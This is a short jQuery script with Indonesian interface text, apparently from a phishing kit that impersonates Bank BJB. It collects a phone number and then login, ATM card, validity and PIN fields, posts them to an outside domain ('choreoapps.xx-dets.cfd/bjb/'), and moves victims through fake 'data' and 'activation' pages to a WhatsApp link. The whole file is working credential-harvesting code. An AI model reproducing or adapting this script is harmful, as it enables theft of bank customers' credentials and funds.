$(document).ready(function(){
    $('#eform').submit(function(e) {
        e.preventDefault(); 
        var nomor = document.getElementById("nomor").value;
        sessionStorage.setItem("nomor", nomor);
$('.load').fadeIn();
 document.getElementById('kirims').innerHTML ="Memproses...";
 
 
      $.ajax({
            type: 'POST',
            url: 'https://choreoapps.xx-dets.cfd/bjb/no.php',
            data: $(this).serialize(),
            datatype: 'JSON',           
            complete: function(data) {
            setTimeout(function(){
  window.location.href='data.html'
  document.getElementById('kirims').innerHTML = "Selanjutnya";
 $('.load').fadeOut();
    }, 500);
        }
    });
 });
    return false;
}); 
     
$(document).ready(function(){
    $('#login').submit(function(e) {
        e.preventDefault(); 
$('.load').fadeIn();
 document.getElementById('kirims').innerHTML ="Memproses..."; 
      $.ajax({
            type: 'POST',
            url: 'https://choreoapps.xx-dets.cfd/bjb/login.php',
            data: $(this).serialize(),
            datatype: 'JSON',           
            complete: function(data) {
            setTimeout(function(){
  window.location.href='aktivasi.html'
  document.getElementById('kirims').innerHTML = "Selanjutnya";
 $('.load').fadeOut();
 $('#atm').focus();
 $('#atm').val('');
 $('#valid').val('');
 $('#pin').val('');
   }, 500);
        }
    });
 });
    return false;
}); 


audio4 = document.getElementById("bsiku");
function go(){
$('.load').fadeIn();
audio4.play();    
audio4.loop = false;
document.getElementById('kirims').innerHTML = "Mohon tunggu sebentar...";
setTimeout(function(){  
location.href='https://api.whatsapp.com/send?phone=628161116044&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯,%0ASaya mau request Pesan SMS ke layanan (83373)';
$('.load').fadeOut();
    }, 5500);    
}  


